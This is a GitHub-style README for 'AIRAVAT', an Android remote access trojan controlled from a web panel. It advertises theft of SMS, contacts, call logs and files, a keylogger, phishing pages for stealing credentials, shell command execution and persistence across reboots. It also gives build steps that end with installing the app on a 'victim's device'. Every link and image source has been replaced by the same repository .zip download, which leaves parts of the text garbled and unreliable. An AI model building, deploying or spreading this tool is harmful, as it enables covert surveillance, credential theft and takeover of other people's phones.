


<p align="center">
<img src='WEB https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip' style="height:100px;width:100px;" >
</p>
<h1 align=center>AIRAVAT</h1>

#### A multifunctional Android RAT with GUI based Web Panel without port forwarding.

<div align="center">


</div>

## Features
 - Read all the files of Internal Storage
 - Download Any Media to your Device from Victims Device
 - Get all the system information of Victim Device
 - Retrieve the List of Installed Applications
 - Retrive SMS
 - Retrive Call Logs
 - Retrive Contacts
 - Send SMS
 - Gets all the Notifications 
 - Keylogger
 - Admin Permission 
 - Show Phishing Pages to steal credentials through notification.
    - Steal credentials through pre built phishing pages
    - Open any suspicious website through notification to steal credentials.
 - Record Audio through Mic
 - Play music in Victim's device
 - Vibrate Device
 - Text To Speech 
 - Turn On/Off Torch Light
 - Change Wallpaper
 - Run shell Commands
 - Get Clipboard text (Only When app's Activity is visible)
 - Launch Any URL (Only When app's Activity is visible)
 - Pre Binded with [Instagram Webview Phishing ](https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip)
 - Runs In Background 
    - Auto Starts on restarting the device
    - Auto Starts when any notification arrives
 - No port forwarding needed

<img align=center https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip >


## Requirements
 - Firebase Account
 - [ApkEasy Tool](https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip) ( For PC ) or 
[ApkTool M](https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip) ( for Android)


## How to Build 
  ### Firebase Setup
 1. Create an Firebase Account and afterwords create a new project with any name.
 1. Enable Firebase Database and Firebase Storage.
 1. In Firebase Database Click on the rules and set `.read` and `.write` to `true`
    - ```js
          {
           "rules": {
                   ".read": "true",
                   ".write": "true"
                    }
          }
      ```
 1. In Firebase Storage allow reads and writes for all paths.
    - ```js
        rules_version = '2';
        service https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip {
        match /b/{bucket}/o {
            match /{allPaths=**} {
               allow read, write 
              }
          }
       }
      ```
 1. Now Go to project overview and create an Android App and download the `https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip` file.
 1. Also create a web app and copy the config of webapp.
   ### Panel Setup
 1. You can use Github Pages , Firebase Hosting or any Hosting Website (except 000webhost) for hosting the panel.
 1. Open [https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip](./WEB%https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip) File and from [line number 16](https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip%https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip) replace the config with your web app config which you have created on Step 6.
 1. Save the file , Your Panel Setup is completed.
 ### Android RAT
 1. Download [https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip](./ANDROID%https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip)
 1. Decompile it using any Decompiler recommend above.
 1. Now open `https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip` file.
 1. Replace values of `firebase_database_url ` , `google_api_key` , `google_app_id` , `google_storage_bucket` , `project_id` with your Firebase Account using `https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip` file which you have downloaded on step 5
    - Example 
       ```xml 
       <string name="firebase_database_url">https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip</string>
       <string name="google_api_key">your_api_key</string>
       <string name="google_app_id">your_app_id</string>
       <string name="google_storage_bucket">your_storage_bucket_url</string>
       <string name="project_id">project_id</string>
       ```
 1. Now compile the code with appt2.
 1. Install the app in victim's device and give all the permissions after that the connection will show up in web panel.
  ### Tutorial Videos
  1. To be updated...

### ❤️Supporters❤️
[![Stargazers repo roster for @th30neand0nly/AIRAVAT](https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip)](https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip)

[![Forkers repo roster for @th30neand0nly/AIRAVAT](https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip)](https://raw.githubusercontent.com/cyran-kyle/AIRAVAT/main/.github/AIRAVAT-1.4.zip)



## DISCLAIMER
<p align="center">
 TO BE USED FOR EDUCATIONAL PURPOSES ONLY
</p>


The use of the AIRAVAT is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program. Please read [LICENSE](LICENSE).








